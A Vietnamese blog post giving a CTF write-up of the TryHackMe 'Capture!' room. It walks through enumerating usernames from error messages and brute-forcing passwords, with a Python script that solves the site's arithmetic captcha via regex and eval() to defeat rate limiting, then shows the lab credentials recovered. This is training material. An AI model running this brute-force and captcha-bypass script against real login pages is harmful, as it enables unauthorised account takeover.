---
layout: post
author: "Neo"
title: "Tryhackme - Capture!"
date: "2023-06-21"
tags: [
    "tryhackme",
    "web",
    "brute-force",
    "captcha",
    "python"
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

[TryHackMe - Capture!](https://tryhackme.com/room/capture)
## Reconnaissance and Scanning

Ngay ở Task 1 tôi đã được cung cấp 1 thư mục chứa 2 file là danh sách usernames và passwords, có thể nghĩ ngay đến việc sử dụng 2 list này để brute-force.

Bài này cũng không cần thiết phải scan port vì ở phần mô tả đã cho tôi sẵn phải truy cập vào http://MACHINE-IP, nghĩa là chỉ có port 80 đang mở.

Sau khi chạy máy và truy cập vào web tôi được 1 site login. 

![login](/assets/img/2023-07-21-THM-Capture!/1.png)

Sau khi thử login vài lần thì tôi bị dính captcha. Vậy là web có cơ chế rate limit để tránh brute-force. Tuy nhiên, captcha này chỉ là các phép tính cộng trừ nhân chia các số tự nhiên, vậy nên tôi có thể nghĩ đến việc viết python script để bypass captcha này trong mỗi phiên brute-force.

## Python script

Với sự giúp đã của ChatGPT, tôi có thể viết lại script như sau.

Import requests để lấy Session, sử dụng để brute force, import thêm *re* để sử dụng các biểu thức chính quy.

Đầu tiên tôi cần phải lấy từng dòng trong 2 file usernames.txt và passwords.txt ra để làm username và password, loại bỏ dấu xuống dòng, chỉ lấy đúng phần text trong từng dòng. 

Thêm url để thực hiện POST request.

```python
#! /usr/bin/python

from requests import Session
import re 

url = "http://10.10.140.153/login"

usernames = open('usernames.txt','r').read().splitlines()
passwords = open('passwords.txt','r').read().splitlines()
```

Khi đăng nhập sai, trang web hiện ***Error: The user does not exist***. 

![error](/assets/img/2023-07-21-THM-Capture!/3.png)

Vậy thì tôi sẽ brute force username trước bằng cách kiểm tra xem khi nào dữ liệu trả về không chứa đoạn ký tự ***does not exist***, đó là username hợp lệ cần tìm.

```python
for user in usernames:

 response = session.post(url,data=data)
 data['username'] = user
 
 if 'does not exist' not in response.text:
  print(f'Found username: {user}')
  print(f'Attempting to brute forcing passowrd for user: {user}')
```

Tiếp theo, cần có thêm 1 hàm để giải captcha sau mỗi phiên đăng nhập sai. Sử dụng biểu thức chính quy để định dạng phép tính của captcha.

```python
(\s\s\d+\s[+*-/]\s\d+)\s\=\s\?
```

Sử dụng hàm *complie()* để đọc biểu thức chính quy trên. Sử dụng hàm *findall()* trả về tất cả kết quả khớp với mẫu trong chuỗi. Sử dụng hàm *eval()* để trả về kết quả mà biểu thức phía trên thực hiện.

```python
def solve_captcha(response):
 
  captcha_syntax = re.compile(r'(\s\s\d+\s[+*-/]\s\d+)\s\=\s\?')
  captcha = captcha_syntax.findall(response)
  return eval(' '.join(captcha))
```

Cuối cùng, tôi sẽ ghép các phần lại với nhau. Đầu tiên, tạo post session chứa data là username và password. 

- Nếu trong response trả về không có chứa đoạn ký tự ***does not exist***, đó là username hợp lệ cần tìm
- Nếu trong response trả về có chứa đoạn ký tự ***Captcha enabled*** thì gọi hàm **solve_captcha** để xử lý.
- Nếu trong response trả về không có chứa đoạn ký tự ***Error***, đó là password hợp lệ cần tìm

Script cuối cùng của tôi sẽ trông như thế này

```python
#! /usr/bin/python

from requests import Session
import re 

url = "http://10.10.140.153/login"

# Removing the line feed (\n) from the usernames and passwords read from the respective files
usernames = open('username.txt','r').read().splitlines()
passwords = open('password.txt', 'r').read().splitlines()


def solve_captcha(response):
 
  captcha_syntax = re.compile(r'(\s\s\d+\s[+*-/]\s\d+)\s\=\s\?')
  captcha = captcha_syntax.findall(response)
  return eval(' '.join(captcha))

#initializing a session
session = Session() 
data = {'username': 'username','password':'password'}
# create a post request to the url with the payload/data using the session opened
response = session.post(url,data=data) 

for user in usernames:

 response = session.post(url,data=data)
 data['username'] = user

 if 'Captcha enabled' in response.text:

  captcha_result = solve_captcha(response.text)

  data['captcha'] = captcha_result

 response = session.post(url,data =data)

 if 'does not exist' not in response.text:
  
  print(f'Found username: {user}')
  print(f"Trying brute force passowrd for user: {user}")

  for password in passwords:

   captcha_result = solve_captcha(response.text)
   data['password'] = password
   data['captcha'] = captcha_result

   response = session.post(url,data=data)

   if 'Error' not in response.text:

    print(f'----> Found Username: {user} Password: {password} ')
    exit()
   
   else:
    print(f'[*]Trying password: {password} for user ')
 
 else:
  print(f'[*] Trying brute force password for user: {user}')
```

Kết quả 

```python 
[*]Trying password: 147258369 for user 
[*]Trying password: fernandez for user 
[*]Trying password: sakura for user 
[*]Trying password: robbie for user 
[*]Trying password: qwert for user 
[*]Trying password: shaggy for user 
[*]Trying password: 123654789 for user 
[*]Trying password: popcorn for user 
[*]Trying password: martha for user 
[*]Trying password: dance for user 
[*]Trying password: brooke for user 
[*]Trying password: 147852369 for user 
----> Found Username: natalie Password: sk8board                                                           
┌──(root㉿kali)-[/home/kali]
└─# 
```

Login site

![flag](/assets/img/2023-07-21-THM-Capture!/2.png)

